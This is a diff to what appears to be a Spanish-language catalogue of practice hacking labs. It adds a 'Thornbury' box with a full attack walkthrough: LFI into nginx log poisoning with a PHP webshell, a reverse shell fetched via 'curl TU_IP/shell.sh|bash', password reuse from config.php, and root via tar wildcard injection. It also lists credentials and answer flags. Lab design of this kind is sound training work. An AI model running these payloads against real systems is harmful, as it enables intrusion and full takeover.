@@ -799,6 +799,83 @@ noise:
 
 ---
 
+## Box 11 — `Thornbury`
+
+```
+id: 11
+name: Thornbury
+os: linux
+difficulty: medium
+est_time: 60-90 min
+tags: [web, lfi, path-traversal, log-poisoning, rce, password-reuse, cron, tar-wildcard-injection]
+
+target_ip: 10.10.14.50
+tun0_ip: 10.11.0.7
+
+services:
+  22: OpenSSH 8.9p1 (sin vector)
+  80: nginx 1.18.0 + PHP 8.1 — web corporativa "Thornbury Timber"
+
+surface:
+  - Menú navega con `index.php?page=home|services|about|contact`. Comentario HTML: "TODO: move page includes to a whitelist - Dave".
+  - `?page=/etc/passwd` -> error `include("pages/" . $page)` = prefijo `pages/`, SIN sufijo `.php` (LFI limpio, requiere traversal).
+  - `?page=../../../../etc/passwd` -> OK. Users con shell: dave, backupsvc.
+  - id_rsa de users/root -> Permission denied (LFI corre como www-data).
+
+chain:
+  - step: foothold-lfi-logpoison
+    trigger: LFI limpio + servidor nginx
+    technique: LFI -> log poisoning (nginx access.log) -> RCE
+    cheat_ref: [[02-web]] (LFI to RCE)
+    aha: www-data no lee id_rsa (600) pero SÍ el access.log; envenena el User-Agent con PHP
+    expected_action: "curl -A '<?php system($_GET[c]); ?>' -> ?page=../../../var/log/nginx/access.log&c=id"
+    hints:
+      - "LFI corre como www-data: ¿qué fichero controlas tú el contenido y www-data lee? -> logs. 02-web."
+      - "log poisoning: inyecta PHP en el User-Agent, luego incluye el log."
+      - "ruta: NO apache2 (es nginx) y NO webroot -> /var/log/nginx/access.log ; recuerda el traversal por el prefijo pages/."
+    resultado: RCE www-data -> reverse (curl TU_IP/shell.sh|bash)
+  - step: lateral-cred-reuse
+    trigger: shell www-data en /var/www/html
+    technique: credencial de config.php reutilizada
+    cheat_ref: [[claves]] (credential reuse desde configs)
+    aha: antes de privesc, LEER la app; config.php tiene la pass de BD, reutilizada para backupsvc
+    expected_action: "cat config.php -> T1mb3r!Sawmill#22 -> nxc ssh -u dave backupsvc -> backupsvc [+]"
+    hints: ["www-data en webroot -> vector nº1 = creds en config, no SUID", "cat config.php/.env", "la pass de BD suele reusarse para un user del sistema (el del comentario: backupsvc)"]
+  - step: privesc-tar-wildcard
+    trigger: pspy muestra cron root `tar czf ... *` desde dir escribible
+    technique: wildcard injection con tar (--checkpoint-action)
+    cheat_ref: [[07-privesc-linux]] (cron / wildcard)
+    aha: el script (root, no escribible) hace `cd /opt/thornbury-backups; tar czf ... *`; el dir es group-writable por backupsvc -> el `*` mete nombres de fichero como FLAGS de tar
+    expected_action: |
+      cd /opt/thornbury-backups
+      echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' > shell.sh
+      touch -- '--checkpoint=1'
+      touch -- '--checkpoint-action=exec=sh shell.sh'
+      # esperar cron -> /tmp/rootbash -p
+    hints:
+      - "no puedes reescribir el script (root), pero mira el DIRECTORIO del `tar *` y el `*`. 07-privesc."
+      - "wildcard injection: tar interpreta nombres de fichero como opciones."
+      - "crea '--checkpoint=1' y '--checkpoint-action=exec=sh shell.sh' + shell.sh (SUID bash). (`exec=sh` no requiere +x)."
+    resultado: SUID bash como root -> /tmp/rootbash -p -> root
+
+creds:
+  - thornbury_web : T1mb3r!Sawmill#22   (config.php; reutilizada)
+  - backupsvc : T1mb3r!Sawmill#22       (SSH; user flag)
+
+flags:
+  user: a7f3c901e6b24d08f5c1e9b740a2d836
+  root: 8f2142c6b0e7d539a1c48f0b6e2d7c91
+
+noise:
+  - SUID/caps estándar (su, mount, ping cap_net_raw) = baseline, NO vector.
+  - dave existe pero su pass NO es la de la config (solo backupsvc reutiliza).
+  - distracción típica del alumno: ir a apache2 / webroot para el log (es nginx, /var/log/nginx).
+```
+
+**Lección pedagógica:** LFI limpio (sin `.php`) → **log poisoning** nginx (envenenar User-Agent) → RCE; **leer configs antes que privesc** (cred reuse); y **`tar`/`rsync`/`zip` + `*` ejecutado por root desde carpeta escribible = wildcard injection** (`--checkpoint-action`). Despiste a evitar: asumir rutas de log sin releer el `whatweb` (apache2 vs nginx).
+
+---
+
 ## 📈 Ideas de evolución (roadmap del proyecto)
 
 - Añadir cajas Windows (SeImpersonate → PrintSpoofer/GodPotato) y AD (roasting → DCSync) con el mismo esquema.
